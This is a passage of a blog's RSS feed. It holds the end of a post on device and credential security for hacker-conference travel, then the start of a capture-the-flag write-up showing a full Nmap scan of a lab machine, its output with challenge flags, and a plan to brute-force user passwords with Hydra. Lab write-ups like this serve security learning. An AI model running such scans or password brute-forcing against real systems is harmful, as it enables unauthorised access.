if you’re interested) in case I need tools I can’t run on the iPad (this is actually less common than you’d think).&lt;/li&gt;
&lt;li&gt;All of my devices are encrypted.&lt;/li&gt;
&lt;li&gt;I use Face ID on my iPad Pro and iPhone, but &lt;em&gt;not&lt;/em&gt; for the lock screen. A strong passcode or PIN is required for initial device access — I think of Face ID as an extra layer of security for individual apps rather than what provides the actual &lt;em&gt;device&lt;/em&gt; security.&lt;/li&gt;
&lt;li&gt;I run a minimal-ish set of applications, and regularly review and uninstall anything I’m not currently using.&lt;/li&gt;
&lt;li&gt;Before leaving (generally the morning I head for the airport, unless i have a &lt;em&gt;really&lt;/em&gt; early flight), I make sure that all of my devices are running the most up-to-date versions of their operating systems and apps, and run a complete backup.&lt;/li&gt;
&lt;li&gt;I have &lt;a href=&quot;https://www.apple.com/icloud/find-my/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Find My&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; active on all of my devices so if the device is stolen I can lock/wipe it remotely.&lt;/li&gt;
&lt;li&gt;Finally, I use &lt;a href=&quot;https://protonvpn.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Proton VPN&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; on all my devices. I do this not for “privacy” reasons, but because using a VPN is a way to ensure that any applications that are &lt;em&gt;not&lt;/em&gt; using encrypted connections or are vulnerable to downgrade attacks have an extra layer of protection. That Proton VPN also provides some on-the-wire malware blocking is an added bonus.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now, hacker conferences &lt;em&gt;do&lt;/em&gt; generally have a more hostile radio frequency environment, so I do take extra care here.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I turn off Bluetooth and leave it off attending the conference. Since I only travel with wired headphones, this isn’t a big hardship for me. The only time I turn on Bluetooth is if I want to edit any photography (I have an &lt;a href=&quot;https://www.apple.com/apple-pencil/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Apple Pencil&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; for my iPad), but I only do this when away from the conference area.&lt;/li&gt;
&lt;li&gt;I remove all &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/wifi&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/wifi&quot;&gt;Wi-Fi&lt;/a&gt; networks from my devices (which means deleting them from iCloud Keychain). For DEF CON, I configure &lt;a href=&quot;https://wifireg.defcon.org/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the secure conference Wi-Fi&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; before leaving. That said, I keep &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/wifi&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/wifi&quot;&gt;Wi-Fi&lt;/a&gt; turned off on my devices as well unless I absolutely need it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Finally, you want to be careful what you’re plugging into your devices. Personally, I bring my own cables and charger, and don’t use anything provided by another conference attendee or plug in any devices (for example, USB drives) that I didn’t bring with me.&lt;/p&gt;
&lt;p&gt;There’s not some kind of magical “hacker miasma” at these conferences that puts your device at risk — someone looking to compromise your device needs to be able to get data to it. By limiting connections to radio networks and avoiding untrusted devices, the opportunity for an attack is severely curtailed (though it cannot be eliminated). The main risk here is someone attempting to subvert a trusted connection (the DEF CON secure &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/wifi&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/wifi&quot;&gt;Wi-Fi&lt;/a&gt; network, the Bluetooth connection to my Apple Pencil, or the cellular radio on my iPhone); the best defense is simply keeping your shit up-to-date and pre-configure trusted connections. It’s very unlikely that someone is going to burn a cellular zero day on you at a hacker conference.&lt;/p&gt;
&lt;p&gt;If your risk model is that a nation state is gunning for you, then you need to be worrying about a lot more than just conference security! Needless to say, this guide is not, then, for you.&lt;/p&gt;
&lt;h3 id=&quot;a-note-about-credential-management&quot;&gt;A note about credential management&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#a-note-about-credential-management&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;An important layer of defense at hacker conferences, when traveling, or just &lt;em&gt;in life&lt;/em&gt; is good credential management.&lt;/p&gt;
&lt;p&gt;I use different usernames/emails for almost every service. Both &lt;a href=&quot;https://proton.me/support/catch-all&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Proton Mail&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and &lt;a href=&quot;https://support.google.com/a/answer/2685650&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Google Workspace&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; can be configured with catch-all email addresses. If you don’t want to pay money, then sign up for Gmail and liberally use &lt;a href=&quot;https://support.google.com/a/users/answer/9308648&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the &lt;code&gt;+&lt;/code&gt; functionality&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Use unique, random passwords for as many services as you can. Use a password manager (&lt;a href=&quot;https://keepassxc.org&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;KeePassXC&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and compatible applications are good choices) to make this easy to manage. Don’t store these credentials in your browser or system keychain.&lt;/p&gt;
&lt;p&gt;Set up multi-factor authentication on &lt;em&gt;every&lt;/em&gt; account that supports it. Whenever possible, use a hardware key (like a &lt;a href=&quot;https://www.yubico.com/products/yubikey-5-overview/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;YubiKey&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;). As a bonus, you can use hardware security keys to further lock down access to your password manager: Do this using either &lt;a href=&quot;https://keepassxc.org/docs/KeePassXC_UserGuide.html#_database_settings&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;built-in support&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, or by storing a long random string in one of your security key “slots” and then using this &lt;em&gt;in addition to&lt;/em&gt; a string that you’ve memorized to access your password vault (full-featured YubiKeys — not the lower-end “security keys” Yubico sells — support both options).&lt;/p&gt;
&lt;h2 id=&quot;packing&quot;&gt;Packing&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#packing&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;I’m a light packer, partly because I don’t like checking bags, and partly because I enjoy the challenge. This year I managed to fit all of my gear into a single &lt;a href=&quot;https://www.peakdesign.com/products/everyday-backpack&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Peak Design 20 L Everyday Backpack&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (with the help of two small &lt;a href=&quot;https://www.peakdesign.com/products/packing-cube/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;packing cubes&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;). However, this is all a tight fit — there’s next to no room for conference swag on the return trip, and the laptop compartments are compressed more than I’m comfortable with. Moving forward, I intend to switch to a Peak Design 30 L Everyday Backpack, as I think that the extra 10 L should be more than enough for me.&lt;/p&gt;
&lt;p&gt;There’s enough (low profile) pockets in the Peak Design Everyday backpack that I don’t need a cord bag, and it’s a reasonable size to use as a day bag at the conference itself. This requires some unpacking/repacking at the hotel, but that’s a small price to pay to avoid having to carry an entire additional bag. Peak Design products are a bit pricey, but I’ve experimented with &lt;em&gt;a lot&lt;/em&gt; of different bags over the years and they’re hands-down the most durable, versatile bags I’ve ever owned.&lt;/p&gt;
&lt;p&gt;One thing that’s enables me to pack light is that I’ve moved away from wearing jeans. Instead, I’ve switched to &lt;a href=&quot;https://shop.bluffworks.com/products/ascender-5-pocket-pants-regular-fit-asphalt-black&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Bluffworks’ Ascender 5-Pocket Pants&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, which are tough, light, wrinkle-resistant, &lt;em&gt;very&lt;/em&gt; compressible, and have the bonus of being much harder to pick pocket than most other mens’ pants (though again, a determined thief can still defeat them). I pair these with Icebreaker &lt;a href=&quot;https://www.icebreaker.com/en-us/mens-underwear&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;underwear&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and &lt;a href=&quot;https://www.icebreaker.com/en-us/mens-socks&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;socks&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, which are also exceptionally light and durable. Bluffworks also makes &lt;a href=&quot;https://shop.bluffworks.com/products/gramercy-blazer-classic-fit-blue-hour&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;travel blazers&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and &lt;a href=&quot;https://shop.bluffworks.com/pages/performance-suits&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;other outfits for less casual situations&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;; these are also good for traveling light, but by necessity take up a bit more space. There’s a trade-off between looking nice and packing light that is just difficult to navigate.&lt;/p&gt;
&lt;p&gt;One disadvantage of this setup is that it’s difficult to bring multiple pairs of shoes. I opt to just wear a pair of black running shoes — they’re not dress shoes, but they’re comfortable and sufficiently understated that you can get away with using them in less casual situations in a pinch.&lt;/p&gt;
&lt;h2 id=&quot;at-the-con&quot;&gt;At the con&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#at-the-con&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;At the conference, or really when traveling in general, I try to avoid being conspicuous. I don’t wear conference swag/merch. I don’t put stickers on my devices. I take off my conference badge and put it in my backpack when it’s not required. I don’t flash (or carry) big wads of cash.&lt;/p&gt;
&lt;p&gt;In short, I try not to &lt;em&gt;look&lt;/em&gt; like a target. Ideally, there should be no way for someone who sees you outside of the conference to know that you are an attendee.&lt;/p&gt;
&lt;h3 id=&quot;a-note-on-masks&quot;&gt;A note on masks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#a-note-on-masks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;I don’t like wearing masks, but if I’m going to wear one I’m going to wear an &lt;em&gt;effective&lt;/em&gt; one. Since HOPE and DEF CON were both masked events, I brought along tight-fitting &lt;a href=&quot;https://bnx.com/products/n95-mask-black-made-in-usa-bifold-h95b/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;N95 masks&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; for use while attending the conference.&lt;/p&gt;
&lt;p&gt;The problem with a well-fitted N95 masks is that they’re kind of a pain to take off. This makes both eating and (more importantly) drinking a less attractive proposition. I wound up going back to my hotel to do both during the day, which created larger gaps in my schedule than I planned.&lt;/p&gt;
&lt;p&gt;Moving forward, I don’t think it makes sense to bring a water bottle to any events that have a mask requirement. I also need to remember that I can’t effectively pull off my normal back-to-back-to-back event schedule at conferences with mask requirements. This means doing &lt;em&gt;less&lt;/em&gt; at these events than I otherwise would, but &lt;em&gt;c’est la vie&lt;/em&gt; in the time of plague.&lt;/p&gt;</description>
    <pubDate>Mon, 15 Aug 2022 00:00:00 GMT</pubDate>
  </item><item>
    <title>Net sec challenge</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2022-04-03-net-sec-challenge</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2022-04-03-net-sec-challenge</guid>
    <description>&lt;p&gt;This CTF is just a series of questions. All should be solvable using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt;, telnet, and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hydra&quot;&gt;Hydra&lt;/a&gt;… Though I’m going to substitute &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/netcat&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/netcat&quot;&gt;netcat&lt;/a&gt; for telnet. However, I’m sticking to the spirit of things, and will only use those three tools.&lt;/p&gt;
&lt;p&gt;The target machine is 10.10.152.115.&lt;/p&gt;
&lt;p&gt;We’ll start off with a full &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt; scan:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; net-sec-challenge&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; --reason&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.152.115&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Results:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sun Apr  3 20:48:04 2022 as: nmap -v -oN net-sec-challenge -Pn -A --reason -T4 -p- 10.10.152.115
Increasing send delay for 10.10.152.115 from 0 to 5 due to 909 out of 2271 dropped probes since last increase.
Increasing send delay for 10.10.152.115 from 5 to 10 due to 11 out of 15 dropped probes since last increase.
Nmap scan report for 10.10.152.115
Host is up, received user-set (0.19s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 61 (protocol 2.0)
| ssh-hostkey: 
|   3072 da:5f:69:e2:11:1f:7c:66:80:89:61:54:e8:7b:16:f3 (RSA)
|   256 3f:8c:09:46:ab:1c:df:d7:35:83:cf:6d:6e:17:7e:1c (ECDSA)
|_  256 ed:a9:3a:aa:4c:6b:16:e6:0d:43:75:46:fb:33:b2:29 (ED25519)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
80/tcp    open  http        syn-ack ttl 61 lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Hello, world!
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
8080/tcp  open  http        syn-ack ttl 61 Node.js (Express middleware)
|_http-title: Site doesn&#039;t have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
10021/tcp open  ftp         syn-ack ttl 61 vsftpd 3.0.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.92%I=7%D=4/3%Time=624A60E5%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,&quot;SSH-2\.0-OpenSSH_8\.2p1 THM{946219583339}
&quot;);
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/3%OT=22%CT=1%CU=32245%PV=Y%DS=4%DC=T%G=Y%TM=624A6111
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11
OS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 12.801 days (since Tue Mar 22 01:54:39 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

Host script results:
|_clock-skew: -1s
| nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: &amp;#x3C;unknown&gt;, NetBIOS MAC: &amp;#x3C;unknown&gt; (unknown)
| Names:
|   NETSEC-CHALLENG&amp;#x3C;00&gt;  Flags: &amp;#x3C;unique&gt;&amp;#x3C;active&gt;
|   NETSEC-CHALLENG&amp;#x3C;03&gt;  Flags: &amp;#x3C;unique&gt;&amp;#x3C;active&gt;
|   NETSEC-CHALLENG&amp;#x3C;20&gt;  Flags: &amp;#x3C;unique&gt;&amp;#x3C;active&gt;
|   WORKGROUP&amp;#x3C;00&gt;        Flags: &amp;#x3C;group&gt;&amp;#x3C;active&gt;
|_  WORKGROUP&amp;#x3C;1e&gt;        Flags: &amp;#x3C;group&gt;&amp;#x3C;active&gt;
| smb2-time: 
|   date: 2022-04-04T03:07:53
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   47.27 ms  10.13.0.1
2   ... 3
4   222.58 ms 10.10.152.115

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr  3 21:08:01 2022 -- 1 IP address (1 host up) scanned in 1197.32 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This enables us to answer a set of questions immediately, but after this things get harder…&lt;/p&gt;
&lt;p&gt;We start off by attempting to brute force the password for eddie or quinn using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hydra&quot;&gt;Hydra&lt;/a&gt;. To do this, we’re going to run two &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hydra&quot;&gt;Hydra&lt;/a&gt; tasks in parallel.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0&quot;&gt;# Hydra task to break eddie&#039;s password.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
